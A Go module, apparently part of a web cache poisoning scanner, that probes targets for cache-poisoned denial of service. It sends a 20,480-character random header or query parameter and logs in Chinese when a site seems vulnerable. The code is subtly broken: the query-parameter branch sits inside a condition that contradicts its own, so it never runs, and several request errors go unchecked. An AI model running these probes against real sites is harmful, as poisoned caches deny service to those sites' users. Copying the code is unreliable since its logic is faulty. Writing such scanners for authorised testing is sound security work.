package dos

import (
	"github.com/projectdiscovery/gologger"
	"github.com/wealeson1/wcpvs/internal"
	"github.com/wealeson1/wcpvs/internal/logic/tecniques"
	"github.com/wealeson1/wcpvs/pkg/utils"
	"net/http"
)

type HHO struct {
	payload string
}

var HHOTecnique *HHO

func init() {
	HHOTecnique = NewHHO()
}

func NewHHO() *HHO {
	// 初始暂定8K
	payload := utils.RandomString(20480)
	return &HHO{
		payload: payload,
	}
}

func (h *HHO) Scan(target *internal.TargetStruct) {
	if target.Cache.CKIsGet {
		randomHeader := utils.RandomString(10)
		resp, err := tecniques.GetResp(target, tecniques.HEADER, map[string]string{randomHeader: h.payload})
		if err != nil {
			gologger.Error().Msg(err.Error())
			return
		}
		if resp.StatusCode != http.StatusOK {
			tmpReq := resp.Request
			resp2, _ := utils.CommonClient.Do(tmpReq)
			tmpReq.Header.Set(randomHeader, "AAA")
			resp3, _ := utils.CommonClient.Do(tmpReq)
			if resp2.StatusCode == resp3.StatusCode {
				gologger.Info().Msgf("目标%s 存在CPDOS漏洞，检测技术是HHO", target.Request.URL)
			}
		}
		if !target.Cache.CKIsGet && target.Cache.CKIsHeader {
			randomParam := utils.RandomString(10)
			resp, err := tecniques.GetResp(target, tecniques.GET, map[string]string{randomParam: h.payload})
			if err != nil {
				gologger.Error().Msg(err.Error())
				return
			}
			if resp.StatusCode != http.StatusOK {
				tmpReq := resp.Request
				resp2, _ := utils.CommonClient.Do(tmpReq)
				values := tmpReq.URL.Query()
				values.Set(randomParam, "AAA")
				tmpReq.URL.RawQuery = values.Encode()
				resp3, _ := utils.CommonClient.Do(tmpReq)
				if resp2.StatusCode == resp3.StatusCode {
					gologger.Info().Msgf("目标%s 存在CPDOS漏洞，检测技术是PHO(GET参数溢出)", target.Request.URL)
				}
			}
		}
	}
}
